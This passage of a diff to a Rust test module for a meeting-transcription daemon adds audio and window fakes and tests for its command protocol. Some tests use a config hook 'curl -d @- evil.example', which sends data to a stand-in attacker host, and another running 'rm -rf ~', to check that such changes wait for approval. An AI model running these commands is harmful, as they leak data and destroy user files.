@@ -2083,6 +2083,8 @@ mod tests {
     use futures::stream::{self, StreamExt};
 
     use super::*;
+    use crate::adapters::http;
+    use crate::adapters::session_files::SessionFiles;
     use crate::ports::{EchoCancelling, FRAME_SAMPLES, Frame, Heard, TranscriptionError};
 
     fn raw() -> Value {
@@ -2187,18 +2189,44 @@ mod tests {
         )
     }
 
-    /// A source that ends at once.
-    struct Silence;
+    /// A source that hears its frames once, then ends.
+    struct Clip(Vec<Frame>);
 
-    impl AudioSource for Silence {
+    impl AudioSource for Clip {
         fn frames(&mut self) -> stream::BoxStream<'_, Result<Frame, AudioError>> {
-            stream::empty().boxed()
+            stream::iter(std::mem::take(&mut self.0).into_iter().map(Ok)).boxed()
         }
     }
 
-    /// Three devices; logs every capture it builds.
+    /// Six seconds of three people speaking, from the speaker fixture.
+    fn speech() -> Vec<Frame> {
+        let bytes = include_bytes!("../tests/fixtures/speaker-clips.s16");
+        let samples: Vec<i16> = bytes
+            .chunks_exact(2)
+            .map(|pair| i16::from_le_bytes([pair[0], pair[1]]))
+            .collect();
+        samples
+            .chunks_exact(FRAME_SAMPLES)
+            .map(<[i16]>::to_vec)
+            .collect()
+    }
+
+    /// Three devices; logs every capture it builds and each echo cancellation.
+    /// Its sources hear the speech fixture when `speech`, and end at once
+    /// otherwise; cancelling the echo fails when `echo_fails`.
     #[derive(Default)]
-    struct FakeAudio(Mutex<Vec<String>>);
+    struct FakeAudio {
+        captured: Mutex<Vec<String>>,
+        speech: bool,
+        echo_fails: bool,
+    }
+
+    impl FakeAudio {
+        fn source(&self, name: String) -> Box<dyn AudioSource> {
+            self.captured.lock().unwrap().push(name);
+            Box::new(Clip(if self.speech { speech() } else { Vec::new() }))
+        }
+    }
 
     impl AudioDevices for FakeAudio {
         fn list(&self) -> BoxFuture<'static, Vec<Device>> {
@@ -2211,17 +2239,23 @@ mod tests {
         }
 
         fn capture(&self, device: &Device) -> Box<dyn AudioSource> {
-            self.0.lock().unwrap().push(device.id.clone());
-            Box::new(Silence)
+            self.source(device.id.clone())
         }
 
         fn capture_cancelled(&self) -> Box<dyn AudioSource> {
-            self.0.lock().unwrap().push("cancelled".into());
-            Box::new(Silence)
+            self.source("cancelled".into())
         }
 
-        fn cancel_echo(&self, _: &str) -> BoxFuture<'static, Result<EchoCancelling, AudioError>> {
-            async { Ok(Box::new(()) as EchoCancelling) }.boxed()
+        fn cancel_echo(&self, mic: &str) -> BoxFuture<'static, Result<EchoCancelling, AudioError>> {
+            self.captured.lock().unwrap().push(format!("echo {mic}"));
+            let fails = self.echo_fails;
+            async move {
+                match fails {
+                    true => Err(AudioError("no echo-cancel module".into())),
+                    false => Ok(Box::new(()) as EchoCancelling),
+                }
+            }
+            .boxed()
         }
     }
 
@@ -2245,7 +2279,7 @@ mod tests {
             ]
         );
         assert_eq!(
-            *audio.0.lock().unwrap(),
+            *audio.captured.lock().unwrap(),
             ["@default-input", "@default-output"]
         );
         let events = events.lock().unwrap();
@@ -2263,14 +2297,13 @@ mod tests {
         let (emit, _) = recorder();
         let audio = FakeAudio::default();
         let found = inputs(&config, Some(Path::new("dir/x.wav")), &audio, &[], &emit);
-        let [replay] = found.as_slice() else {
-            panic!("one input")
-        };
+        assert_eq!(found.len(), 1);
+        let replay = &found[0];
         assert_eq!(
             (&*replay.id, &*replay.label, &*replay.participant),
             ("replay", "x.wav", "Recrutador")
         );
-        assert!(audio.0.lock().unwrap().is_empty());
+        assert!(audio.captured.lock().unwrap().is_empty());
     }
 
     #[tokio::test]
@@ -2296,7 +2329,7 @@ mod tests {
         );
         assert_eq!(
             audio
-                .0
+                .captured
                 .lock()
                 .unwrap()
                 .iter()
@@ -2331,10 +2364,9 @@ mod tests {
             };
             self.0.lock().unwrap().push(format!("{name} started"));
             let sessiond = Sessiond(Arc::clone(&self.0), name);
-            Box::pin(async move {
-                let _sessiond = sessiond;
-                std::future::pending().await
-            })
+            // Runs until dropped, and says so.
+            let running = std::future::pending::<Result<(), AudioError>>();
+            Box::pin(running.map(move |ran| ran.map(|()| drop(sessiond))))
         }
     }
 
@@ -2347,7 +2379,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn dropping_the_follower_stops_the_running_capture() {
+    async fn the_capture_follows_the_recording_sessions_until_none_can_record() {
         let log = Log::default();
         let (recording, watched) = watch::channel(BTreeSet::new());
         let (emit, _) = recorder();
@@ -2361,7 +2393,8 @@ mod tests {
         // A second session listening with another model keeps the capture running.
         recording.send_replace(listening(&["deepgram", "whisper"]));
         tokio::time::sleep(Duration::from_millis(10)).await;
-        stop(Some(follower)).await;
+        drop(recording);
+        follower.await.unwrap();
         assert_eq!(
             *log.lock().unwrap(),
             [
@@ -2404,10 +2437,8 @@ mod tests {
     async fn a_replacement_starts_once_the_previous_pipeline_is_gone() {
         let log = Log::default();
         let sessiond = Sessiond(Arc::clone(&log), "old");
-        let previous = tokio::spawn(async move {
-            let _sessiond = sessiond;
-            std::future::pending::<()>().await
-        });
+        let running = std::future::pending::<()>();
+        let previous = tokio::spawn(running.map(move |()| drop(sessiond)));
         tokio::task::yield_now().await;
         stop(Some(previous)).await;
         log.lock().unwrap().push("new started".into());
@@ -2462,10 +2493,11 @@ mod tests {
                 }))
             )
         );
-        let CallTo::NewWindow(Some(made)) = route_call(None, call.clone()) else {
-            panic!("no window is open, so one opens to make the call");
-        };
-        assert_eq!(serde_json::from_str::<Value>(&made).unwrap(), call);
+        // No window is open, so one opens to make the call.
+        assert_eq!(
+            route_call(None, call.clone()),
+            CallTo::NewWindow(Some(call.to_string()))
+        );
     }
 
     #[test]
@@ -2500,18 +2532,20 @@ mod tests {
         raw
     }
 
-    fn held(change: ConfigChange) -> Value {
+    /// The config a change adopts, or the config and event it is held with.
+    fn outcome(change: ConfigChange) -> Result<Config, Box<(Config, Value)>> {
         match change {
-            ConfigChange::Hold(_, event) => event,
-            ConfigChange::Adopt { config, .. } => panic!("adopted {config:?}"),
+            ConfigChange::Adopt { config, .. } => Ok(config.unwrap()),
+            ConfigChange::Hold(config, event) => Err(Box::new((config, event))),
         }
     }
 
+    fn held(change: ConfigChange) -> Value {
+        outcome(change).unwrap_err().1
+    }
+
     fn adopted(change: ConfigChange) -> Config {
-        match change {
-            ConfigChange::Adopt { config, .. } => config.unwrap(),
-            ConfigChange::Hold(_, event) => panic!("held {event}"),
-        }
+        outcome(change).unwrap()
     }
 
     #[test]
@@ -2591,10 +2625,9 @@ mod tests {
     /// A held change of `raw()` with a hook running `hook`.
     fn hold(pending: &mut Pending, hook: &str) -> Value {
         let current = Config::from_value(raw()).unwrap();
-        match config_change(&current, "secret", &with_hook(hook).to_string()) {
-            ConfigChange::Hold(config, event) => pending.hold(config, event),
-            ConfigChange::Adopt { config, .. } => panic!("adopted {config:?}"),
-        }
+        let change = config_change(&current, "secret", &with_hook(hook).to_string());
+        let (config, event) = *outcome(change).unwrap_err();
+        pending.hold(config, event)
     }
 
     #[test]
@@ -2773,5 +2806,1438 @@ mod tests {
         assert_eq!(told(&greeting).len(), 1);
         stop(Some(running)).await;
         assert_eq!(told(&greeting), [] as [Value; 0]);
+    }
+
+    /// The VAD model `mise run setup` downloads, loaded once.
+    fn vad() -> SileroModel {
+        static VAD: std::sync::OnceLock<SileroModel> = std::sync::OnceLock::new();
+        let load = || SileroModel::load(&paths::vad_model()).expect("run `mise run setup`");
+        VAD.get_or_init(load).clone()
+    }
+
+    /// The windows open, each its number and the session it shows, and what was
+    /// asked of them; while `refuse`, none opens or takes the keyboard.
+    #[derive(Default)]
+    struct Desk {
+        open: Vec<(u32, String)>,
+        last: u32,
+        asked: Vec<String>,
+        refuse: bool,
+        hidden: Option<bool>,
+    }
+
+    /// Windows on a `Desk`; one exits for each status sent to `exits`.
+    struct FakeWindows {
+        desk: Arc<Mutex<Desk>>,
+        exits: mpsc::UnboundedReceiver<ExitStatus>,
+    }
+
+    impl Overlay for FakeWindows {
+        fn shown(&self) -> Vec<String> {
+            let desk = self.desk.lock().unwrap();
+            desk.open.iter().map(|(_, shows)| shows.clone()).collect()
+        }
+
+        fn newest(&self) -> Option<u32> {
+            self.desk
+                .lock()
+                .unwrap()
+                .open
+                .last()
+                .map(|(number, _)| *number)
+        }
+
+        fn is_open(&self) -> bool {
+            !self.desk.lock().unwrap().open.is_empty()
+        }
+
+        fn open<'a>(
+            &'a mut self,
+            show: Option<&'a str>,
+            call: Option<&'a str>,
+        ) -> BoxFuture<'a, io::Result<()>> {
+            let mut desk = self.desk.lock().unwrap();
+            let (show, call) = (show.unwrap_or_default(), call.unwrap_or_default());
+            desk.asked.push(format!("open {show} {call}"));
+            let opened = (!desk.refuse).then(|| {
+                desk.last += 1;
+                let number = desk.last;
+                desk.open.push((number, show.to_string()));
+            });
+            let opened = opened.ok_or_else(|| io::Error::other("eco-window exited with 1"));
+            Box::pin(async move { opened })
+        }
+
+        fn focus(&self, number: u32) -> BoxFuture<'_, io::Result<()>> {
+            let mut desk = self.desk.lock().unwrap();
+            desk.asked.push(format!("focus {number}"));
+            let focused = match desk.refuse {
+                true => Err(io::Error::other("no window to focus")),
+                false => Ok(()),
+            };
+            Box::pin(async move { focused })
+        }
+
+        fn shows(&mut self, number: u32, session: &str) {
+            let mut desk = self.desk.lock().unwrap();
+            for (open, shows) in &mut desk.open {
+                if *open == number {
+                    *shows = session.to_string();
+                }
+            }
+        }
+
+        fn hide_from_share(&mut self, hidden: bool) -> BoxFuture<'_, ()> {
+            self.desk.lock().unwrap().hidden = Some(hidden);
+            Box::pin(async {})
+        }
+
+        fn exited(&mut self) -> BoxFuture<'_, Option<ExitStatus>> {
+            Box::pin(async move {
+                let status = self.exits.recv().await.expect("the test holds the sender");
+                self.desk.lock().unwrap().open.remove(0);
+                Some(status)
+            })
+        }
+
+        fn close(self: Box<Self>) -> BoxFuture<'static, ()> {
+            self.desk.lock().unwrap().asked.push("close".into());
+            Box::pin(async {})
+        }
+    }
+
+    /// A session served against fakes, its files in `dir`.
+    struct Daemon {
+        session: Session,
+        events: Arc<Mutex<Vec<Value>>>,
+        desk: Arc<Mutex<Desk>>,
+        exits: mpsc::UnboundedSender<ExitStatus>,
+        dir: tempfile::TempDir,
+    }
+
+    /// Diarizes nothing: no speaker model is set up.
+    fn no_diarizer() -> Diarizer {
+        Arc::new(|_| None)
+    }
+
+    fn daemon(raw: Value) -> Daemon {
+        daemon_on(raw, Arc::new(FakeAudio::default()), no_diarizer())
+    }
+
+    fn daemon_on(raw: Value, audio: Arc<FakeAudio>, diarizer: Diarizer) -> Daemon {
+        let dir = tempfile::tempdir().unwrap();
+        let (emit, events) = recorder();
+        let log: Arc<dyn SessionLog> = Arc::new(SessionFiles::new(dir.path().join("sessions")));
+        let people: Arc<dyn PeopleStore> = Arc::new(PeopleFiles::new(dir.path().join("people")));
+        let assistant = Assistant::new(
+            Arc::clone(&emit),
+            Arc::clone(&log),
+            Arc::clone(&people),
+            Arc::new(ShellHooks),
+        );
+        let desk: Arc<Mutex<Desk>> = Arc::default();
+        let (exits, exited) = mpsc::unbounded_channel();
+        let session = Session {
+            config_path: dir.path().join("config.toml"),
+            current: Config::from_value(raw).unwrap(),
+            token: "secret".into(),
+            pending: Arc::default(),
+            rig: Rig {
+                replay: None,
+                audio,
+                vad: vad(),
+                diarizer,
+                outages: Outages::default(),
+            },
+            assistant,
+            emit,
+            pipeline: None,
+            background: JoinSet::new(),
+            log,
+            people,
+            importing: None,
+            windows: Box::new(FakeWindows {
+                desk: Arc::clone(&desk),
+                exits: exited,
+            }),
+            overlay_open: Arc::default(),
+        };
+        Daemon {
+            session,
+            events,
+            desk,
+            exits,
+            dir,
+        }
+    }
+
+    /// Each event's code when it is an error, its type otherwise.
+    fn said(events: &[Value]) -> Vec<String> {
+        let name = |event: &Value| event.get("code").unwrap_or(&event["type"]).clone();
+        events
+            .iter()
+            .map(|event| name(event).as_str().unwrap_or_default().to_string())
+            .collect()
+    }
+
+    impl Daemon {
+        /// Handle `line`; every event it emitted at once.
+        async fn line(&mut self, line: &str) -> Vec<Value> {
+            self.events.lock().unwrap().clear();
+            assert!(self.session.handle(line).await, "{line} stopped the daemon");
+            self.events.lock().unwrap().clone()
+        }
+
+        /// The first event `wanted` picks, once it is emitted.
+        async fn until(&self, wanted: impl Fn(&Value) -> bool) -> Value {
+            until(&self.events, wanted).await
+        }
+
+        fn asked(&self) -> Vec<String> {
+            self.desk.lock().unwrap().asked.clone()
+        }
+
+        /// Start a live session titled `title`; its id.
+        async fn start(&mut self, title: &str) -> String {
+            let start = json!({"language": "pt", "title": title});
+            let events = self.line(&format!("session.start {start}")).await;
+            events[0]["session"]["id"].as_str().unwrap().to_string()
+        }
+
+        /// Run the pipeline of the current config; its snapshot.
+        async fn configured(&mut self) -> Value {
+            self.session.restart().await;
+            self.until(|event| event["type"] == "snapshot").await
+        }
+    }
+
+    #[tokio::test]
+    async fn every_command_reaches_the_assistant_with_its_fields() {
+        let mut d = daemon(raw());
+        let id = d.start("Retro").await;
+        // Each line, what it emits, and one field that shows what it was given.
+        let cases: Vec<(String, Vec<&str>, &str, Value)> = vec![
+            (
+                "note remember this".into(),
+                vec!["note"],
+                "/0/text",
+                json!("remember this"),
+            ),
+            (
+                "action probe".into(),
+                vec!["action.unknown"],
+                "/0/params/name",
+                json!("probe"),
+            ),
+            (
+                format!(r#"session.language {{"id": "{id}", "language": "EN "}}"#),
+                vec!["session.invalid"],
+                "/0/params/detail",
+                json!("no language \"en\""),
+            ),
+            (
+                "session.pause".into(),
+                vec!["session"],
+                "/0/session/state",
+                json!("paused"),
+            ),
+            (
+                format!("session.resume {id} "),
+                vec!["session"],
+                "/0/session/state",
+                json!("recording"),
+            ),
+            (
+                "session.toggle".into(),
+                vec!["session"],
+                "/0/session/state",
+                json!("paused"),
+            ),
+            (
+                "sessions".into(),
+                vec!["sessions"],
+                "/0/sessions/0/id",
+                json!(id),
+            ),
+            (
+                "sessions.search retro".into(),
+                vec!["sessions_found"],
+                "/0/ids",
+                json!([id]),
+            ),
+            (
+                format!("session.show {id}"),
+                vec!["session_detail"],
+                "/0/session/id",
+                json!(id),
+            ),
+            (
+                format!("session.timeline {id}"),
+                vec!["session_timeline"],
+                "/0/timeline/0/text",
+                json!("remember this"),
+            ),
+            (
+                format!(r#"session.rename {{"id": "{id}", "title": "Retro Q3", "kind": "idea"}}"#),
+                vec!["session.invalid"],
+                "/0/params/detail",
+                json!("unknown kind \"idea\""),
+            ),
+            ("tags".into(), vec!["tags"], "/0/tags", json!([])),
+            (
+                format!(r#"session.tag {{"id": "{id}", "tag": "q3"}}"#),
+                vec!["session", "session_tags", "tags"],
+                "/1/tags",
+                json!(["q3"]),
+            ),
+            (
+                format!(r#"session.untag {{"id": "{id}", "tag": "q3"}}"#),
+                vec!["session", "session_tags", "tags"],
+                "/1/tags",
+                json!([]),
+            ),
+            (
+                r#"tag.rename {"from": "q3", "to": "q4"}"#.into(),
+                vec!["tag.not_found"],
+                "/0/params/tag",
+                json!("q3"),
+            ),
+            (
+                r#"tag.delete {"tag": "q4"}"#.into(),
+                vec!["tag.not_found"],
+                "/0/params/tag",
+                json!("q4"),
+            ),
+            (
+                format!(r#"session.speaker {{"id": "{id}", "label": "Eles", "name": "Ana"}}"#),
+                vec!["speaker_renamed"],
+                "/0/name",
+                json!("Ana"),
+            ),
+            (
+                format!("session.speakers {id}"),
+                vec!["session_speakers"],
+                "/0/session",
+                json!(id),
+            ),
+            (
+                format!("session.cost {id}"),
+                vec!["session_cost"],
+                "/0/session",
+                json!(id),
+            ),
+            (
+                format!(
+                    r#"session.line.edit {{"id": "{id}", "who": "Eu", "at": 1.5, "text": "oi"}}"#
+                ),
+                vec!["line.not_found"],
+                "/0/params",
+                json!({"id": id, "who": "Eu", "at": 1.5}),
+            ),
+            (
+                format!(r#"session.line.remove {{"id": "{id}", "who": "Eu", "at": 2.5}}"#),
+                vec!["line.not_found"],
+                "/0/params/at",
+                json!(2.5),
+            ),
+            ("people".into(), vec!["people"], "/0/people", json!([])),
+            (
+                "people.adopt".into(),
+                vec!["people_adopted"],
+                "/0/count",
+                json!(0),
+            ),
+            (
+                format!(r#"person.attend {{"session": "{id}", "person": "", "name": "Ana"}}"#),
+                vec!["attendees_changed", "sessions", "people"],
+                "/2/people/0/name",
+                json!("Ana"),
+            ),
+            (
+                format!(r#"person.leave {{"session": "{id}", "person": "p1"}}"#),
+                vec!["person.not_found"],
+                "/0/params/id",
+                json!("p1"),
+            ),
+            (
+                format!(
+                    r##"person.assign {{"session": "{id}", "label": "Eles", "person": "", "name": "Bia", "color": "#ff0000"}}"##
+                ),
+                vec!["speaker.invalid"],
+                "/0/message",
+                json!("session has no matching speaker"),
+            ),
+            (
+                format!(
+                    r##"session.speaker_color {{"session": "{id}", "label": "Eles", "color": "#0000ff"}}"##
+                ),
+                vec!["speaker.invalid"],
+                "/0/message",
+                json!("speaker not found"),
+            ),
+            (
+                format!(
+                    r#"person.assign_line {{"id": "{id}", "who": "Eu", "at": 1.5, "person": "", "name": "Caio"}}"#
+                ),
+                vec!["line.not_found"],
+                "/0/params/who",
+                json!("Eu"),
+            ),
+            (
+                format!(r#"person.assign_all {{"session": "{id}", "person": "", "name": "Duda"}}"#),
+                vec!["speaker.invalid"],
+                "/0/message",
+                json!("session has no matching speaker"),
+            ),
+            (
+                format!(r#"person.unassign {{"session": "{id}", "label": "Eles"}}"#),
+                vec![
+                    "speaker_renamed",
+                    "session_speakers",
+                    "attendees_changed",
+                    "sessions",
+                    "people",
+                ],
+                "/0/label",
+                json!("Eles"),
+            ),
+            (
+                format!(r#"session.context {{"id": "{id}", "contexts": ["cv"]}}"#),
+                vec!["session_context"],
+                "/0/contexts",
+                json!(["cv"]),
+            ),
+            (
+                format!(r#"person.guess.clear {{"session": "{id}", "label": "Eles"}}"#),
+                vec!["speaker.invalid"],
+                "/0/message",
+                json!("the speaker has no guess to clear"),
+            ),
+            (
+                r#"person.add {"name": "Eva"}"#.into(),
+                vec!["people"],
+                "/0/people/1/name",
+                json!("Eva"),
+            ),
+            (
+                r#"person.rename {"id": "p1", "name": "Eva"}"#.into(),
+                vec!["person.not_found"],
+                "/0/params/id",
+                json!("p1"),
+            ),
+            (
+                r#"person.merge {"into": "p1", "from": "p2"}"#.into(),
+                vec!["person.not_found", "person.not_found"],
+                "/1/params/id",
+                json!("p2"),
+            ),
+            (
+                "person.forget p3 ".into(),
+                vec!["person.not_found"],
+                "/0/params/id",
+                json!("p3"),
+            ),
+            (
+                r#"session.ask {"id": "nope", "question": "why?"}"#.into(),
+                vec!["session.not_found"],
+                "/0/params/id",
+                json!("nope"),
+            ),
+            (
+                format!(r#"session.note {{"id": "{id}", "text": "later"}}"#),
+                vec!["note"],
+                "/0/text",
+                json!("later"),
+            ),
+            (
+                format!(r#"session.action {{"id": "{id}", "name": "minutes"}}"#),
+                vec!["action.unknown"],
+                "/0/params/name",
+                json!("minutes"),
+            ),
+            (
+                format!(r#"hook.send {{"session": "{id}", "id": "e1"}}"#),
+                vec!["answer.not_found"],
+                "/0/params/id",
+                json!("e1"),
+            ),
+            (
+                format!(r#"entry.remove {{"session": "{id}", "id": "e2"}}"#),
+                vec!["suggestion_removed"],
+                "/0/id",
+                json!("e2"),
+            ),
+            (
+                format!("session.export {id}"),
+                vec!["session_export"],
+                "/0/text",
+                json!("WEBVTT\n"),
+            ),
+            (
+                "session.export nope".into(),
+                vec!["session.not_found"],
+                "/0/params/id",
+                json!("nope"),
+            ),
+            (
+                format!("session.end {id}"),
+                vec!["session"],
+                "/0/session",
+                Value::Null,
+            ),
+            (
+                format!("session.reopen {id}"),
+                vec!["session"],
+                "/0/session/state",
+                json!("recording"),
+            ),
+            (
+                format!("session.delete {id}"),
+                vec!["session.live"],
+                "/0/params/id",
+                json!(id),
+            ),
+            (
+                "dance with me".into(),
+                vec!["command.unknown"],
+                "/0/params/command",
+                json!("dance with me"),
+            ),
+        ];
+        for (line, expected, field, value) in cases {
+            let events = d.line(&line).await;
+            assert_eq!(said(&events), expected, "{line}");
+            assert_eq!(json!(events).pointer(field), Some(&value), "{line}");
+        }
+        assert!(!d.session.handle("stop").await);
+    }
+
+    #[tokio::test]
+    async fn a_command_without_its_fields_says_what_is_missing() {
+        let mut d = daemon(raw());
+        for (line, detail) in [
+            ("session.rename {}", "missing id"),
+            (
+                r#"session.rename {"id": "x", "title": "t"}"#,
+                "missing kind",
+            ),
+            (
+                "session.tag {",
+                "EOF while parsing an object at line 1 column 1",
+            ),
+            (
+                r#"session.line.remove {"id": "x", "who": "Eu"}"#,
+                "missing at",
+            ),
+            (
+                r#"person.assign_line {"id": "x", "who": "Eu", "at": 1}"#,
+                "missing person",
+            ),
+            (
+                r#"session.context {"id": "x"}"#,
+                "session.context needs an id and a list of contexts",
+            ),
+            (
+                "session.context x",
+                "session.context needs an id and a list of contexts",
+            ),
+            (r#"person.attend {"session": "x"}"#, "missing person"),
+            (r#"person.assign {"session": "x"}"#, "missing label"),
+            (
+                r#"person.assign_all {"session": "x", "person": ""}"#,
+                "missing name",
+            ),
+            (r#"entry.translate {"session": "x"}"#, "missing id"),
+            (r#"session.translation {"id": "x"}"#, "missing language"),
+            (r#"session.ask {"id": "x"}"#, "missing question"),
+        ] {
+            let events = d.line(line).await;
+            assert_eq!(said(&events), ["session.invalid"], "{line}");
+            assert_eq!(events[0]["params"]["detail"], detail, "{line}");
+        }
+    }
+
+    #[tokio::test]
+    async fn a_session_starts_of_a_kind_in_a_language_with_its_tags_and_contexts() {
+        let mut d = daemon(raw());
+        let start = json!({"title": "1:1", "kind": "conversation", "language": "pt",
+                           "tags": ["q3"], "contexts": ["cv"], "window": 2});
+        let events = d.line(&format!("session.start {start}")).await;
+        let started = &events[0]["session"];
+        assert_eq!(
+            (&started["title"], &started["kind"], &started["language"]),
+            (&json!("1:1"), &json!("conversation"), &json!("pt"))
+        );
+        assert_eq!(started["contexts"], json!(["cv"]));
+        let last = events.last().unwrap();
+        assert_eq!(
+            *last,
+            json!({"type": "session_opened", "id": started["id"], "window": 2})
+        );
+        let tagged = events.iter().find(|e| e["type"] == "session_tags").unwrap();
+        assert_eq!(tagged["tags"], json!(["q3"]));
+        // The first kind by default, and no window told without one.
+        let events = d.line(r#"session.start {"language": "en"}"#).await;
+        assert_eq!(said(&events), ["session"]);
+        assert_eq!(events[0]["session"]["kind"], "meeting");
+        assert_eq!(events[0]["session"]["contexts"], Value::Null);
+        for (start, detail) in [
+            ("{", "EOF while parsing an object at line 1 column 1"),
+            (r#"{"title": "x"}"#, "missing language"),
+            (
+                r#"{"language": "pt", "kind": "party"}"#,
+                "unknown kind \"party\"",
+            ),
+            (r#"{"language": 5}"#, "no language \"5\""),
+        ] {
+            let events = d.line(&format!("session.start {start}")).await;
+            assert_eq!(said(&events), ["session.invalid"], "{start}");
+            assert_eq!(events[0]["params"]["detail"], detail, "{start}");
+        }
+    }
+
+    #[tokio::test]
+    async fn the_config_and_the_devices_are_listed_on_demand() {
+        let mut d = daemon(raw());
+        d.line("config").await;
+        let config = d.until(|event| event["type"] == "config").await;
+        assert_eq!(config["config"], d.session.current.to_value());
+        assert_eq!(config["devices"][2]["id"], "usb-mic");
+        assert_eq!(config["presets"], presets());
+        assert_eq!(config["omapass"]["page"], omapass::PAGE);
+        d.line("devices").await;
+        let devices = d.until(|event| event["type"] == "devices").await;
+        assert_eq!(devices["devices"], config["devices"]);
+    }
+
+    #[test]
+    fn omapass_lists_its_accounts_or_says_why_not() {
+        let account = omapass::Account {
+            account: "openrouter".into(),
+            folder: "eco".into(),
+        };
+        assert_eq!(
+            omapass_listed(Ok(vec![account]), || unreachable!()),
+            json!({"type": "omapass", "installed": true,
+                   "accounts": [{"account": "openrouter", "folder": "eco"}]})
+        );
+        assert_eq!(
+            omapass_listed(Err("omapass is not installed".into()), || false),
+            json!({"type": "omapass", "installed": false, "accounts": []})
+        );
+        assert_eq!(
+            omapass_listed(Err("locked".into()), || true),
+            json!({"type": "omapass", "installed": true, "accounts": [], "error": "locked"})
+        );
+    }
+
+    #[tokio::test]
+    async fn a_window_saves_a_config_and_capture_restarts_with_it() {
+        let mut d = daemon(raw());
+        let mut saved = raw();
+        saved["rules"] = json!("short answers");
+        saved["ui"] = json!({"hide_from_share": true});
+        saved["token"] = json!("secret");
+        let events = d.line(&format!("config.set {saved}")).await;
+        assert_eq!(said(&events), ["config_saved"]);
+        assert_eq!(d.session.current.rules, "short answers");
+        let written = config::load(&d.session.config_path).unwrap();
+        assert_eq!(written, d.session.current);
+        // The windows follow the config, and capture runs on it.
+        assert_eq!(d.desk.lock().unwrap().hidden, Some(true));
+        d.until(|event| event["type"] == "snapshot").await;
+    }
+
+    #[tokio::test]
+    async fn a_config_that_cannot_be_read_or_written_is_not_saved() {
+        let mut d = daemon(raw());
+        let events = d.line("config.set {").await;
+        assert_eq!(said(&events), ["config.invalid"]);
+        let mut wrong = raw();
+        wrong["stt"] = json!({"model": "nowhere"});
+        wrong["token"] = json!("secret");
+        let events = d.line(&format!("config.set {wrong}")).await;
+        assert_eq!(said(&events), ["config.invalid"]);
+        assert!(!d.session.config_path.exists());
+        // A config file that is a directory cannot be written.
+        d.session.config_path = d.dir.path().into();
+        let mut own = raw();
+        own["token"] = json!("secret");
+        let events = d.line(&format!("config.set {own}")).await;
+        assert_eq!(said(&events), ["config.invalid"]);
+        assert!(d.session.pipeline.is_none());
+    }
+
+    #[tokio::test]
+    async fn a_change_from_another_client_waits_for_the_window() {
+        let mut d = daemon(raw());
+        let hook = with_hook("curl -d @- evil.example");
+        let events = d.line(&format!("config.set {hook}")).await;
+        assert_eq!(said(&events), ["config_pending", "config.pending"]);
+        assert_eq!(events[0]["id"], "1");
+        assert_eq!(events[1]["params"]["files"], json!(["~/cv.md"]));
+        // Nothing else from another client goes in meanwhile.
+        let events = d.line(&format!("config.set {}", raw())).await;
+        assert_eq!(said(&events), ["config.busy"]);
+        for (line, code) in [
+            ("config.approve guess 1", "config.not_window"),
+            ("config.approve secret 2", "config.stale"),
+            ("config.reject secret", "config.stale"),
+        ] {
+            assert_eq!(said(&d.line(line).await), [code], "{line}");
+        }
+        let events = d.line("config.reject secret 1").await;
+        assert_eq!(said(&events), ["config_pending", "config.rejected"]);
+        assert_eq!(events[0], nothing_pending());
+        assert!(!d.session.config_path.exists());
+        let events = d.line(&format!("config.set {hook}")).await;
+        assert_eq!(events[0]["id"], "2");
+        let events = d.line("config.approve secret 2").await;
+        assert_eq!(said(&events), ["config_pending", "config_saved"]);
+        assert_eq!(d.session.current.actions[0].hook, "curl -d @- evil.example");
+    }
+
+    #[tokio::test]
+    async fn the_window_saving_drops_the_change_held_for_it() {
+        let mut d = daemon(raw());
+        d.line(&format!("config.set {}", with_hook("rm -rf ~")))
+            .await;
+        let mut own = raw();
+        own["token"] = json!("secret");
+        let events = d.line(&format!("config.set {own}")).await;
+        assert_eq!(said(&events), ["config_pending", "config_saved"]);
+        assert_eq!(events[0], nothing_pending());
+        assert!(d.session.pending.lock().unwrap().event().is_none());
+    }
+
+    /// A WebVTT file in `dir` where Ana says good morning.
+    fn transcript_file(dir: &Path) -> PathBuf {
+        let path = dir.join("retro.vtt");
+        let text = "WEBVTT\n\n00:00:01.000 --> 00:00:03.000\n<v Ana>Bom dia a todos\n";
+        std::fs::write(&path, text).unwrap();
+        path
+    }
+
+    #[tokio::test]
+    async fn an_imported_file_becomes_a_session_that_exports_its_lines() {
+        let mut d = daemon(raw());
+        let path = transcript_file(d.dir.path());
+        let import = json!({"path": path, "started_at": 1_790_000_000.0});
+        d.line(&format!("session.import {import}")).await;
+        let started = d.until(|event| event["type"] == "import_started").await;
+        let session = &started["session"];
+        assert_eq!(
+            (&session["title"], &session["kind"], &session["started_at"]),
+            (&json!("retro"), &json!("meeting"), &json!(1_790_000_000.0))
+        );
+        d.until(|event| event["type"] == "import_done").await;
+        let id = session["id"].as_str().unwrap();
+        let events = d.line(&format!("session.export {id}")).await;
+        let text = events[0]["text"].as_str().unwrap();
+        assert!(text.contains("Bom dia a todos"), "{text}");
+    }
+
+    #[tokio::test]
+    async fn an_import_that_cannot_start_says_why() {
+        let mut raw = raw();
+        raw["models"][0]["base_url"] = json!("ws://127.0.0.1:1/listen");
+        let mut d = daemon(raw);
+        let path = transcript_file(d.dir.path());
+        for (import, code, detail) in [
+            (
+                "{".to_string(),
+                "session.invalid",
+                "EOF while parsing an object at line 1 column 1",
+            ),
+            (
+                json!({"path": " "}).to_string(),
+                "import.failed",
+                "no file \"\"",
+            ),
+            (
+                json!({"path": path, "kind": "party", "language": "pt"}).to_string(),
+                "import.failed",
+                "unknown kind \"party\" or language \"pt\"",
+            ),
+        ] {
+            let events = d.line(&format!("session.import {import}")).await;
+            assert_eq!(said(&events), [code], "{import}");
+            assert_eq!(events[0]["params"]["detail"], detail, "{import}");
+        }
+        // A model that cannot be had fails the import before any session exists.
+        d.line(&format!("session.import {}", json!({"path": path})))
+            .await;
+        let failed = d.until(|event| event["code"] == "import.failed").await;
+        let detail = "no streaming transcription known at ws://127.0.0.1:1/listen";
+        assert_eq!(failed["params"]["detail"], detail);
+    }
+
+    #[tokio::test]
+    async fn one_import_runs_at_a_time_until_it_is_cancelled() {
+        let mut d = daemon(raw());
+        d.session.importing = Some(tokio::spawn(std::future::pending()));
+        let path = transcript_file(d.dir.path());
+        let import = format!("session.import {}", json!({"path": path}));
+        assert_eq!(said(&d.line(&import).await), ["import.busy"]);
+        d.line("import.cancel").await;
+        assert!(d.session.importing.is_none());
+        d.line(&import).await;
+        d.until(|event| event["type"] == "import_done").await;
+    }
+
+    #[tokio::test]
+    async fn the_date_of_a_file_is_read_apart() {
+        let mut d = daemon(raw());
